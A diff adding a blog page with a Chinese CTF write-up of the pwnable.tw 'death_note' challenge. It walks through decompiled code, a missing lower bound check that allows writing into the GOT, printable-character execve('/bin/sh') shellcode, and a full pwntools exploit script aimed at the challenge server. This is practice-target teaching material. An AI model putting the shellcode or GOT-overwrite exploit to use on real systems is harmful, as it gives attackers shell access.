@@ -1,0 +1,887 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwnable.tw,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="又摸了几天鱼，最近情绪不高，什么都不想干，但是给自己定的至少每周一篇博客还是必须得完成，坚持一件事，最后总是会有收获。  查看文件基本信息12345678v1cky@ubuntu:~/Desktop/pwnable/DeathNote$ checksec death_note.dms[*] &apos;/home/v1cky/Desktop/pwnable/DeathNote/death_note.dms">
+<meta name="keywords" content="pwnable.tw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw death_note writeup">
+<meta property="og:url" content="https://v1ckydxp.github.io/archives/2019/05/08/pwnable.tw_death_note_writeup/index.html">
+<meta property="og:site_name" content="v1cky&#39;blog">
+<meta property="og:description" content="又摸了几天鱼，最近情绪不高，什么都不想干，但是给自己定的至少每周一篇博客还是必须得完成，坚持一件事，最后总是会有收获。  查看文件基本信息12345678v1cky@ubuntu:~/Desktop/pwnable/DeathNote$ checksec death_note.dms[*] &apos;/home/v1cky/Desktop/pwnable/DeathNote/death_note.dms">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-11T00:59:33.858Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.tw death_note writeup">
+<meta name="twitter:description" content="又摸了几天鱼，最近情绪不高，什么都不想干，但是给自己定的至少每周一篇博客还是必须得完成，坚持一件事，最后总是会有收获。  查看文件基本信息12345678v1cky@ubuntu:~/Desktop/pwnable/DeathNote$ checksec death_note.dms[*] &apos;/home/v1cky/Desktop/pwnable/DeathNote/death_note.dms">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://v1ckydxp.github.io/archives/2019/05/08/pwnable.tw_death_note_writeup/">
+
+
+
+
+
+  <title>pwnable.tw death_note writeup | v1cky'blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">v1cky'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">few words,many deeds!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://v1ckydxp.github.io/archives/2019/05/08/pwnable.tw_death_note_writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="v1cky01dxp">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v1cky'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnable.tw death_note writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-08T11:30:00+08:00">
+                2019-05-08
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-07-11T08:59:33+08:00">
+                2019-07-11
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  5
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>又摸了几天鱼，最近情绪不高，什么都不想干，但是给自己定的至少每周一篇博客还是必须得完成，坚持一件事，最后总是会有收获。</p>
+</blockquote>
+<h3 id="查看文件基本信息"><a href="#查看文件基本信息" class="headerlink" title="查看文件基本信息"></a>查看文件基本信息</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v1cky@ubuntu:~/Desktop/pwnable/DeathNote$ checksec death_note.dms</span><br><span class="line">[*] <span class="string">'/home/v1cky/Desktop/pwnable/DeathNote/death_note.dms'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>32位程序，只开启了canary保护，栈不可执行保护和地址随机化都没有开启。</p>
+</blockquote>
+<h2 id="分析程序基本行为"><a href="#分析程序基本行为" class="headerlink" title="分析程序基本行为"></a>分析程序基本行为</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">             DeathNote</span><br><span class="line">-----------------------------------</span><br><span class="line"> 1. Add a name</span><br><span class="line"> 2. show a name on the note</span><br><span class="line"> 3. delete a name int the note</span><br><span class="line"> 4. Exit</span><br><span class="line">-----------------------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Index :1</span><br><span class="line">Name :dxp</span><br><span class="line">Done !</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">             DeathNote</span><br><span class="line">-----------------------------------</span><br><span class="line"> 1. Add a name</span><br><span class="line"> 2. show a name on the note</span><br><span class="line"> 3. delete a name int the note</span><br><span class="line"> 4. Exit</span><br><span class="line">-----------------------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Index :dxp</span><br><span class="line">Name :dxp</span><br><span class="line">Done !</span><br><span class="line">-----------------------------------</span><br><span class="line">             DeathNote</span><br><span class="line">-----------------------------------</span><br><span class="line"> 1. Add a name</span><br><span class="line"> 2. show a name on the note</span><br><span class="line"> 3. delete a name int the note</span><br><span class="line"> 4. Exit</span><br><span class="line">-----------------------------------</span><br><span class="line">Your choice :2</span><br><span class="line">Index :dxp</span><br><span class="line">Name : dxp</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>基本功能就是添加，打印和删除的功能，但是存储name的index 可以不局限于数字，也可以是字符串等。</p>
+</blockquote>
+<h2 id="IDA分析程序逻辑"><a href="#IDA分析程序逻辑" class="headerlink" title="IDA分析程序逻辑"></a>IDA分析程序逻辑</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  index = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound !!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(note[index]);</span><br><span class="line">  result = index;</span><br><span class="line">  note[index] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Del_note()函数，在free之后将指针置为了0，所以这里不存在UAF。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> index; <span class="comment">// [esp+8h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  index = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound !!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name :"</span>);</span><br><span class="line">  read_input(&amp;s, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !is_printable(&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"It must be a printable name !"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  note[index] = strdup(&amp;s);<span class="comment">//将malloc分配至的地址存储在note[index]中，即note[index]保存字符串的保存地址</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>index只是判断了是否大于10，没有判断下界，这里存在数组越界写，可以在比数组低的位置进行任意写。还判断输入的name是否是可打印字符，这里限制了name必须为可打印字符。</p>
+</blockquote>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><blockquote>
+<p>note指针保存的地址属于bss段，由于可以往数组低地址写，可以改写got表，如我们可以改写printf函数的got地址为shellcode地址，下一次调用printf函数的时候就是调用的shellcode。</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0804</span>A049                 align <span class="number">20</span>h</span><br><span class="line">.bss:<span class="number">0804</span>A060                 <span class="keyword">public</span> note</span><br><span class="line">.bss:<span class="number">0804</span>A060 ; <span class="keyword">void</span> *note[<span class="number">10</span>]</span><br><span class="line">.bss:<span class="number">0804</span>A060 note            dd ?                    ; DATA XREF: add_note+<span class="number">91</span>↑w</span><br><span class="line">.bss:<span class="number">0804</span>A060                                         ; del_note+<span class="number">41</span>↑r ...</span><br><span class="line">.bss:<span class="number">0804</span>A064                 db    ? ;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">t.plt:<span class="number">0804</span>A000 _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:<span class="number">0804</span>A004 dword_804A004   dd <span class="number">0</span>                    ; DATA XREF: sub_8048460↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A008 dword_804A008   dd <span class="number">0</span>                    ; DATA XREF: sub_8048460+<span class="number">6</span>↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A00C off_804A00C     dd offset read          ; DATA XREF: _read↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A010 off_804A010     dd offset <span class="built_in">printf</span>        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A014 off_804A014     dd offset <span class="built_in">free</span>          ; DATA XREF: _free↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A018 off_804A018     dd offset strdup        ; DATA XREF: _strdup↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A01C off_804A01C     dd offset __stack_chk_fail</span><br><span class="line">.got.plt:<span class="number">0804</span>A01C                                         ; DATA XREF: ___stack_chk_fail↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A020 off_804A020     dd offset <span class="built_in">puts</span>          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A024 off_804A024     dd offset <span class="built_in">exit</span>          ; DATA XREF: _exit↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A028 off_804A028     dd offset <span class="built_in">strlen</span>        ; DATA XREF: _strlen↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A02C off_804A02C     dd offset __libc_start_main</span><br><span class="line">.got.plt:<span class="number">0804</span>A02C                                         ; DATA XREF: ___libc_start_main↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A030 off_804A030     dd offset setvbuf       ; DATA XREF: _setvbuf↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A034 off_804A034     dd offset atoi          ; DATA XREF: _atoi↑r</span><br><span class="line">.got.plt:<span class="number">0804</span>A034 _got_plt        ends</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>0x0804A060-0x804A020  = 64; 64/4 =16，所以输入index为-16就可以覆盖puts.got的地址覆盖为shellcode的地址。</p>
+</blockquote>
+<h3 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h3><blockquote>
+<p>这道题主要考的是shellcode 的编写，要全部属于可见字符。不太会汇编，这里是直接参考的学长的。</p>
+</blockquote>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line">    <span class="comment">/* execve(path='/bin///sh', argv=0, envp=0) */</span></span><br><span class="line">    <span class="comment">/* push '/bin///sh\x00' */</span></span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    push <span class="number">0x732f2f2f</span></span><br><span class="line">    push <span class="number">0x6e69622f</span></span><br><span class="line">    push esp</span><br><span class="line">    pop ebx</span><br><span class="line">   <span class="comment">/*rewrite shellcode to get 'int 80'*/</span></span><br><span class="line">    push edx</span><br><span class="line">    pop eax</span><br><span class="line">    push <span class="number">0x60606060</span></span><br><span class="line">    pop edx</span><br><span class="line">    sub byte ptr[eax + <span class="number">0x35</span>] , dl</span><br><span class="line">    sub byte ptr[eax + <span class="number">0x35</span>] , dl</span><br><span class="line">    sub byte ptr[eax + <span class="number">0x34</span>] , dl</span><br><span class="line">    push <span class="number">0x3e3e3e3e</span></span><br><span class="line">    pop edx</span><br><span class="line">    sub byte ptr[eax + <span class="number">0x34</span>] , dl</span><br><span class="line">    <span class="comment">/*set zero to edx*/</span></span><br><span class="line">    push ecx</span><br><span class="line">    pop edx</span><br><span class="line">   <span class="comment">/*set 0x0b to eax*/</span></span><br><span class="line">    push edx</span><br><span class="line">    pop eax</span><br><span class="line">    xor al, <span class="number">0x40</span></span><br><span class="line">    xor al, <span class="number">0x4b</span>    </span><br><span class="line">  <span class="comment">/*foo order,for holding the  place*/</span></span><br><span class="line">    push edx</span><br><span class="line">    pop edx</span><br><span class="line">    push edx</span><br><span class="line">    pop edx</span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode = asm(shellcode) + '\x6b\x40'</span><br></pre></td></tr></table></figure>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10201</span>)</span><br><span class="line"><span class="comment">#p = process('./death_note.dms')</span></span><br><span class="line">elf = ELF(<span class="string">'death_note.dms'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(index,name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Name :'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">    /* execve(path='/bin///sh', argv=0, envp=0) */</span></span><br><span class="line"><span class="string">    /* push '/bin///sh\x00' */</span></span><br><span class="line"><span class="string">    push 0x68</span></span><br><span class="line"><span class="string">    push 0x732f2f2f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    push esp</span></span><br><span class="line"><span class="string">    pop ebx</span></span><br><span class="line"><span class="string">   /*rewrite shellcode to get 'int 80'*/</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    push 0x60606060</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    sub byte ptr[eax + 0x35] , dl</span></span><br><span class="line"><span class="string">    sub byte ptr[eax + 0x35] , dl</span></span><br><span class="line"><span class="string">    sub byte ptr[eax + 0x34] , dl</span></span><br><span class="line"><span class="string">    push 0x3e3e3e3e</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    sub byte ptr[eax + 0x34] , dl</span></span><br><span class="line"><span class="string">    /*set zero to edx*/</span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">   /*set 0x0b to eax*/</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    xor al, 0x40</span></span><br><span class="line"><span class="string">    xor al, 0x4b</span></span><br><span class="line"><span class="string">  /*foo order,for holding the  place*/</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    pop edx</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">    note_addr = <span class="number">0x0804A060</span></span><br><span class="line">    off_set = printf_got-note_addr</span><br><span class="line">    index = off_set/<span class="number">4</span></span><br><span class="line">    shellcode = asm(shellcode) + <span class="string">'\x6b\x40'</span></span><br><span class="line"></span><br><span class="line">    add_note(index,shellcode)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    v1cky01dxp
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://v1ckydxp.github.io/archives/2019/05/08/pwnable.tw_death_note_writeup/" title="pwnable.tw death_note writeup">https://v1ckydxp.github.io/archives/2019/05/08/pwnable.tw_death_note_writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://v1ckydxp.github.io" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwnable-tw/" rel="tag"># pwnable.tw</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/02/pwnable.tw-hacknote-writeup/" rel="next" title="pwnable.tw hacknote writeup">
+                <i class="fa fa-chevron-left"></i> pwnable.tw hacknote writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/05/09/pwnable.tw_silver_bullet_writeup/" rel="prev" title="pwnable.tw silver_bullet writeup">
+                pwnable.tw silver_bullet writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
